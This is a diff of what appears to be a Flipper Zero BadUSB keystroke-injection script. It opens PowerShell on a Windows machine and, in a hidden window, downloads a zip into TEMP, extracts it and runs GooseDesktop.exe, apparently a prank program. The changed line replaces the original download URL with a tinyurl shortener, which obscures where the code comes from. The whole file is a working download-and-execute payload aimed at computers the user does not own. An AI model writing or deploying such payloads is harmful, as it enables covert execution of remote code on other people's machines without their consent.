@@ -8,5 +8,5 @@ DELAY 1000
 STRING powershell.exe
 ENTER
 DELAY 750
-STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://gitfront.io/r/user-6193928/a5WpgTCLW59D/FlipperZero/raw/goose/DG.zip' -OutFile 'DG.zip'; Expand-Archive DG.zip; Start-Process -FilePath '.\DG\GooseDesktop.exe';" -WindowStyle Hidden; exit
+STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://tinyurl.com/2p8c6nnj' -OutFile 'DG.zip'; Expand-Archive DG.zip; Start-Process -FilePath '.\DG\GooseDesktop.exe';" -WindowStyle Hidden; exit
 ENTER
